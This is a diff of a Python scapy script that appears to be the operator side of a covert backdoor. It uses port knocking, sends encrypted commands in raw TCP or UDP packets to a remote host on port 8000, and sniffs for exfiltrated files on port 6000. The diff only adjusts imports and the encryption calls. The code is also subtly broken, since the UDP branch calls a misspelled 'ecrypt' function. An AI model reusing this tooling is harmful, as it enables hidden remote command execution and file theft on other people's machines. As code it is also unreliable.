@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import time, configfile, logging, encryption, helpers, multiprocessing
+import time, configfile, logging, encryption, helpers, multiprocessing, os, sys
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
@@ -10,7 +10,7 @@ Results = ""
 
 def checkRoot():
     if(os.getuid() != 0):
-        exit("This program must be run with root. Try Again..")
+        sys.exit("This program must be run with root. Try Again..")
 
 def sniffForFile():
     sniff(filter='{0} and dst port 6000'.format(configfile.protocol), prn=recvFile)
@@ -23,9 +23,9 @@ def portKnock():
 
 def sendCommand(protocol, data, password):
     if protocol == "tcp":
-        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.password))
+        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data))
     if protocol == "udp":
-        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data, configfile.password))
+        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data))
     send(packet, verbose=0)
 
 def recvCommand(packet):
@@ -38,7 +38,7 @@ def recvCommand(packet):
         if packet.haslayer(Raw):
             if packet[Raw].load == configfile.password:
                 flag = True
-                decryptedData = encryption.decrypt(Results, configfile.password)
+                decryptedData = encryption.decrypt(Results)
                 if decryptedData.startswith(configfile.password):
                     data = decryptedData[len(configfile.password):]
                 else:
